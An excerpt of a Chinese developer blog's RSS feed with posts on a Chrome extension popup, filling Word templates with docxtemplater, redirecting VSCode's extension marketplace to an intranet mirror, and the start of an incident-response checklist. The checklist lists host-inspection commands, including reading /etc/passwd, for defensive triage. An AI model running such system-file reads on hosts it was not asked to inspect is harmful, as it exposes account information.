&#125;, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getResult</span>(<span class="params"></span>) &#123;</span><br><span class="line">    chrome.<span class="property">storage</span>.<span class="property">local</span>.<span class="title function_">get</span>([<span class="string">&quot;result&quot;</span>], <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> data = result.<span class="property">result</span> ?? <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">value</span> = data;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clearButton&#x27;</span>)</span><br><span class="line">button.<span class="property">onclick</span> = clear</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> button2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;getResultButton&#x27;</span>)</span><br><span class="line">button2.<span class="property">onclick</span> = getResult</span><br><span class="line"></span><br><span class="line"><span class="title function_">getResult</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="http://blog.xingxiaowu.cn/tags/chrome%E6%8F%92%E4%BB%B6/">chrome插件</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/09/30/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94Chrome%E6%8F%92%E4%BB%B6%E7%9B%91%E5%90%AC%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的前端之旅（三十）——怎么写word</title>
      <link>http://blog.xingxiaowu.cn/2024/09/12/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94%E6%80%8E%E4%B9%88%E5%86%99word/</link>
      <guid>http://blog.xingxiaowu.cn/2024/09/12/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94%E6%80%8E%E4%B9%88%E5%86%99word/</guid>
      <pubDate>Thu, 12 Sep 2024 10:23:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;有个业务要求，需要先进行一定的自动化操作&lt;/p&gt;
&lt;p&gt;将提取的信息写到Word里&lt;/p&gt;
&lt;h1 id=&quot;docxtemplater&quot;&gt;&lt;a href=&quot;#docxtemplater&quot; class=&quot;headerlink&quot; title=&quot;docxtemplater&quot;&gt;&lt;/a&gt;docxtemplater&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://docxtemplater.com/&quot;&gt;docxtemplater-官网&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/open-xml-templating/docxtemplater&quot;&gt;docxtemplater-GitHub&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;集成&quot;&gt;&lt;a href=&quot;#集成&quot; class=&quot;headerlink&quot; title=&quot;集成&quot;&gt;&lt;/a&gt;集成&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pnpm add docxtemplater pizzip fs-extra&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如果需要插入图片&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pnpm add docxtemplater pizzip fs-extra docxtemplater-image-module-free image-size&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有个业务要求，需要先进行一定的自动化操作</p><p>将提取的信息写到Word里</p><h1 id="docxtemplater"><a href="#docxtemplater" class="headerlink" title="docxtemplater"></a>docxtemplater</h1><p><a href="https://docxtemplater.com/">docxtemplater-官网</a></p><p><a href="https://github.com/open-xml-templating/docxtemplater">docxtemplater-GitHub</a></p><h1 id="集成"><a href="#集成" class="headerlink" title="集成"></a>集成</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm add docxtemplater pizzip fs-extra</span><br></pre></td></tr></table></figure><p>如果需要插入图片</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm add docxtemplater pizzip fs-extra docxtemplater-image-module-free image-size</span><br></pre></td></tr></table></figure><h1 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// docUtils.js</span></span><br><span class="line"><span class="comment">// PizZip is required because docx/pptx/xlsx files are all zipped files, and</span></span><br><span class="line"><span class="comment">// the PizZip library allows us to load the file in memory</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">PizZip</span> = <span class="built_in">require</span>(<span class="string">&quot;pizzip&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Docxtemplater</span> = <span class="built_in">require</span>(<span class="string">&quot;docxtemplater&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs-extra&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ImageModule</span> = <span class="built_in">require</span>(<span class="string">&#x27;docxtemplater-image-module-free&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sizeOf = <span class="built_in">require</span>(<span class="string">&quot;image-size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换模板key</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * filePath: 文档路径</span></span><br><span class="line"><span class="comment"> * renderContent： 文档中的key要替换的内容，例如&#123; image: &quot;examples/image.png&quot; , aa: &quot;123&quot;&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">replaceTemplateKey</span> = (<span class="params">filePath, renderContent</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// Load the docx file as binary content</span></span><br><span class="line">    <span class="keyword">const</span> content = fs.<span class="title function_">readFileSync</span>(filePath, <span class="string">&quot;binary&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> opts = &#123;</span><br><span class="line">        <span class="attr">centered</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">fileType</span>: <span class="string">&quot;docx&quot;</span>,<span class="comment">//Or pptx</span></span><br><span class="line">        <span class="title function_">getImage</span>(<span class="params">tagValue, tagName, meta</span>) &#123;</span><br><span class="line">            <span class="comment">//tagValue is &#x27;examples/image.png&#x27;</span></span><br><span class="line">            <span class="comment">//tagName is &#x27;image&#x27;</span></span><br><span class="line">            <span class="comment">// console.log(&#123; tagValue, tagName, meta &#125;);</span></span><br><span class="line">            <span class="keyword">return</span> fs.<span class="title function_">readFileSync</span>(tagValue);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">getSize</span>(<span class="params">img, tagValue, tagName</span>) &#123;</span><br><span class="line">            <span class="comment">//Pass the function that return image size</span></span><br><span class="line">            <span class="comment">//img is the image returned by opts.getImage()</span></span><br><span class="line">            <span class="comment">//tagValue is &#x27;examples/image.png&#x27;</span></span><br><span class="line">            <span class="comment">//tagName is &#x27;image&#x27;</span></span><br><span class="line">            <span class="comment">//tip: you can use node module &#x27;image-size&#x27; here</span></span><br><span class="line">            <span class="keyword">const</span> sizeObj = <span class="title function_">sizeOf</span>(img);</span><br><span class="line">            <span class="comment">// console.log(sizeObj);</span></span><br><span class="line">            <span class="keyword">const</span> multiple = sizeObj.<span class="property">width</span> / <span class="number">500</span></span><br><span class="line">            <span class="keyword">const</span> width = sizeObj.<span class="property">width</span> / multiple</span><br><span class="line">            <span class="keyword">const</span> height = sizeObj.<span class="property">height</span> / multiple</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> [width, height];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> zip = <span class="keyword">new</span> <span class="title class_">PizZip</span>(content);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> doc = <span class="keyword">new</span> <span class="title class_">Docxtemplater</span>(zip, &#123;</span><br><span class="line">        <span class="attr">modules</span>: [<span class="keyword">new</span> <span class="title class_">ImageModule</span>(opts)],</span><br><span class="line">        <span class="attr">paragraphLoop</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">linebreaks</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 没给的值直接给空</span></span><br><span class="line">    <span class="comment">// doc.setOptions(&#123;</span></span><br><span class="line">    <span class="comment">//     nullGetter: function () &#123;</span></span><br><span class="line">    <span class="comment">//         return &quot;&quot;;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;); </span></span><br><span class="line">    </span><br><span class="line">    doc.<span class="title function_">render</span>(renderContent);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> buffer = doc.<span class="title function_">getZip</span>().<span class="title function_">generate</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;nodebuffer&quot;</span>,</span><br><span class="line">        <span class="comment">// compression: DEFLATE adds a compression step.</span></span><br><span class="line">        <span class="comment">// For a 50MB output document, expect 500ms additional CPU time</span></span><br><span class="line">        <span class="attr">compression</span>: <span class="string">&quot;DEFLATE&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(filePath, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    replaceTemplateKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="doc模板"><a href="#doc模板" class="headerlink" title="doc模板"></a>doc模板</h1><h2 id="普通的文字"><a href="#普通的文字" class="headerlink" title="普通的文字"></a>普通的文字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 模板.docx</span><br><span class="line"></span><br><span class="line">你好，我是&#123;name&#125;</span><br></pre></td></tr></table></figure><p>renderContent 为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;张三&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好，我是张三</span><br></pre></td></tr></table></figure><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 模板.docx</span><br><span class="line"></span><br><span class="line">&#123;%template_pic_basic_info&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>renderContent 为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">template_pic_basic_info</span>:<span class="string">&quot;file://a/v/b/c.png&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入一张图片，这里不截图了</p><h2 id="布尔，是否渲染"><a href="#布尔，是否渲染" class="headerlink" title="布尔，是否渲染"></a>布尔，是否渲染</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 模板.docx</span><br><span class="line">&#123;#show1&#125;</span><br><span class="line">你好，我是&#123;name1&#125;</span><br><span class="line">&#123;/show1&#125;</span><br><span class="line">你好，我是&#123;name2&#125;</span><br></pre></td></tr></table></figure><p>renderContent 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">show1</span>:<span class="literal">true</span>,</span><br><span class="line">  <span class="attr">name1</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="attr">name2</span>:<span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你好，我是张三</span><br><span class="line">你好，我是李四</span><br></pre></td></tr></table></figure><hr><p>renderContent 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">show1</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">name1</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="attr">name2</span>:<span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好，我是李四</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><p>有多张图片要展示，不知道具体多少张</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 模板.docx</span><br><span class="line">&#123;#template_pic_account_history_info3&#125;</span><br><span class="line">&#123;%image&#125;</span><br><span class="line">&#123;/template_pic_account_history_info3&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>renderContent 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">template_pic_account_history_info3</span>:[</span><br><span class="line">    &#123;<span class="attr">image</span>:<span class="string">&quot;xxx/xxx.png&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">image</span>:<span class="string">&quot;xxx/xxx.png&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">image</span>:<span class="string">&quot;xxx/xxx.png&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">image</span>:<span class="string">&quot;xxx/xxx.png&quot;</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>渲染多张图片</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>基本上就能满足大部分的需求了</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%89%8D%E7%AB%AF/">前端</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="http://blog.xingxiaowu.cn/tags/docx/">docx</category>
      
      <category domain="http://blog.xingxiaowu.cn/tags/doc/">doc</category>
      
      <category domain="http://blog.xingxiaowu.cn/tags/word/">word</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/09/12/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94%E6%80%8E%E4%B9%88%E5%86%99word/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VSCode如何配置插件市场镜像</title>
      <link>http://blog.xingxiaowu.cn/2024/08/08/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/VSCode%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA%E9%95%9C%E5%83%8F/</link>
      <guid>http://blog.xingxiaowu.cn/2024/08/08/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/VSCode%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA%E9%95%9C%E5%83%8F/</guid>
      <pubDate>Thu, 08 Aug 2024 15:22:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;这其实是件很扯淡的事&lt;/p&gt;
&lt;p&gt;因为VSCode的插件市场&lt;/p&gt;
&lt;p&gt;一没有被墙&lt;/p&gt;
&lt;p&gt;二支持离线安装&lt;/p&gt;
&lt;p&gt;那还有这个需求吗？&lt;/p&gt;
&lt;p&gt;但确实有。。。&lt;/p&gt;
&lt;p&gt;我这里是完全的内网环境&lt;/p&gt;
&lt;p&gt;离线安装虽然可以&lt;/p&gt;
&lt;p&gt;但是多少有点麻烦。。。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这其实是件很扯淡的事</p><p>因为VSCode的插件市场</p><p>一没有被墙</p><p>二支持离线安装</p><p>那还有这个需求吗？</p><p>但确实有。。。</p><p>我这里是完全的内网环境</p><p>离线安装虽然可以</p><p>但是多少有点麻烦。。。</p><p>毕竟要在两台机子之间不停的切换</p><p>而且有违规的风险</p><h1 id="偶然"><a href="#偶然" class="headerlink" title="偶然"></a>偶然</h1><p>一次偶然逛内网论坛</p><p>发现有个哥们挂了一个<code>一键配置内网插件市场.exe</code></p><p>我运行了一下</p><p>哇</p><p>在内网环境下就能搜索插件市场了！</p><p>只是安装插件以后</p><p>访问插件的主页</p><p>怎么这么奇怪</p><p>我们正常在外网访问插件市场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://marketplace.visualstudio.com/items?itemName=ms-dotnettools.vscode-dotnet-runtime</span><br></pre></td></tr></table></figure><p>但是我在内网访问</p><p>就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.xxx.com/items?itemName=xxxx</span><br></pre></td></tr></table></figure><h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><p>而且哪怕是通过外网下载，离线安装的，访问也是内网域名</p><p>那就有意思了</p><p>说明这个一定是通过某些方式读取配置的</p><h1 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h1><p>实话实说</p><p>我通过搜索关键词 <code>vscode 插件市场 源 镜像</code>等关键词</p><p>在Bing&#x2F;百度&#x2F;google都搜不到内容</p><p>很想知道具体是什么</p><h1 id="机缘巧合"><a href="#机缘巧合" class="headerlink" title="机缘巧合"></a>机缘巧合</h1><p>机缘巧合之下</p><p>多方打听</p><p>发现一个配置文件</p><p>在安装目录下（或者Windows用户也可以使用<code>everything</code>）</p><p>找到<code>production.json</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 以下为我的本机路径</span><br><span class="line"></span><br><span class="line">D:\SoftWare\VSCode\Microsoft VS Code\resources\app\product.json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用vscode打开</p><p>其中有个配置项为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;extensionsGallery&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;nlsBaseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.vscode-unpkg.net/_lp/&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;serviceUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://marketplace.visualstudio.com/_apis/public/gallery&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;itemUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://marketplace.visualstudio.com/items&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;publisherUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://marketplace.visualstudio.com/publishers&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;resourceUrlTemplate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://&#123;publisher&#125;.vscode-unpkg.net/&#123;publisher&#125;/&#123;name&#125;/&#123;version&#125;/&#123;path&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;controlUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://az764295.vo.msecnd.net/extensions/marketplace.json&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只需要修改其中的<code>serviceUrl</code> <code>itemUrl</code> <code>resourceUrlTemplate</code></p><p>为你的内网地址配置</p><p>（其实我研究了一下，应该就是一个网关把流量代理出去了）</p>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/vscode/">vscode</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/vscode/">vscode</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/08/08/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/VSCode%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA%E9%95%9C%E5%83%8F/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>无星的渗透之旅速成篇（五）-应急</title>
      <link>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/</link>
      <guid>http://blog.xingxiaowu.cn/2024/07/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%94%EF%BC%89-%E5%BA%94%E6%80%A5/</guid>
      <pubDate>Sat, 06 Jul 2024 12:09:00 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-有提示看提示-没提示看网络连接&quot;&gt;&lt;a href=&quot;#1-有提示看提示-没提示看网络连接&quot; class=&quot;headerlink&quot; title=&quot;1.有提示看提示,没提示看网络连接&quot;&gt;&lt;/a&gt;1.有提示看提示,没提示看网络连接&lt;/h1&gt;&lt;p&gt;看网络进程&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -antup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;2-看用户&quot;&gt;&lt;a href=&quot;#2-看用户&quot; class=&quot;headerlink&quot; title=&quot;2.看用户&quot;&gt;&lt;/a&gt;2.看用户&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;3-看定时任务&quot;&gt;&lt;a href=&quot;#3-看定时任务&quot; class=&quot;headerlink&quot; title=&quot;3.看定时任务&quot;&gt;&lt;/a&gt;3.看定时任务&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;crontab -l&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crontab -u 用户&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

